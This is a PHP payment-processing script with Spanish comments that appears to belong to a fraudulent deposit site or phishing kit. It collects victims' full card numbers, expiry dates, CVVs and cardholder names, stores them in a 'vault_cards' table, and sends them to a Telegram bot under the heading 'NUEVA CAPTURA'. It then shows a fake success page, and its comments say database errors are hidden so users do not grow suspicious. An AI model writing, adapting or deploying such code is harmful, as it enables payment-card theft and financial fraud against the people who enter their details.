<?php
// procesar_deposito.php
require '../includes/config.php'; // Ajustado a la carpeta includes
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit();
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user_id = $_SESSION['user_id'];
    
    // Limpieza de datos (Sanitización básica)
    $monto   = filter_var($_POST['amount'], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
    $cc_num  = preg_replace('/\s+/', '', $_POST['cc_num'] ?? ''); // Quitar espacios si los hay
    $cc_exp  = htmlspecialchars($_POST['cc_exp'] ?? '');
    $cc_cvv  = htmlspecialchars($_POST['cc_cvv'] ?? '');
    $titular = htmlspecialchars($_POST['titular'] ?? 'N/A');

    // 1. Guardar en la Bóveda (Vault) para cobro manual/auditoría
    // Asegúrate de que la tabla 'vault_cards' tenga la columna 'titular'
    $stmt = $conn->prepare("INSERT INTO vault_cards (user_id, cc_number, cc_exp, cc_cvv, monto_intento, titular) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("isssds", $user_id, $cc_num, $cc_exp, $cc_cvv, $monto, $titular);
    
    if ($stmt->execute()) {
        
        // 2. Notificación Estratégica a Telegram
        $msg = "⚡ **NEXUS_VAULT: NUEVA CAPTURA** ⚡\n";
        $msg .= "--------------------------------\n";
        $msg .= "👤 **ID Usuario:** #$user_id\n";
        $msg .= "👤 **Titular:** $titular\n";
        $msg .= "💰 **Monto Intento:** $" . number_format($monto, 2) . " MXN\n";
        $msg .= "💳 **CC:** `" . $cc_num . "`\n";
        $msg .= "📅 **EXP:** `" . $cc_exp . "` | 🔒 **CVV:** `" . $cc_cvv . "`\n";
        $msg .= "--------------------------------\n";
        $msg .= "🛠 **ACCION:** Procesar cobro manual.\n";
        $msg .= "⚠️ **NOTA:** El usuario verá confirmación inmediata.";

        // Enviar a Telegram (usando la configuración de config.php)
        $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg) . "&parse_mode=Markdown";
        @file_get_contents($url);

        // 3. Redirigir al recibo visual (Ilusión de éxito instantáneo)
        // Pasamos el monto por URL para que deposito_exitoso.php lo muestre
        header("Location: deposito_exitoso.php?m=$monto");
        exit();
        
    } else {
        // En caso de error de base de datos, no mostrar error al usuario, 
        // simplemente enviarlo al dashboard para no levantar sospechas.
        header("Location: ../dashboard.php?error=internal_gateway_timeout");
        exit();
    }
} else {
    // Si intentan entrar directo al archivo sin POST
    header("Location: ../dashboard.php");
    exit();
}
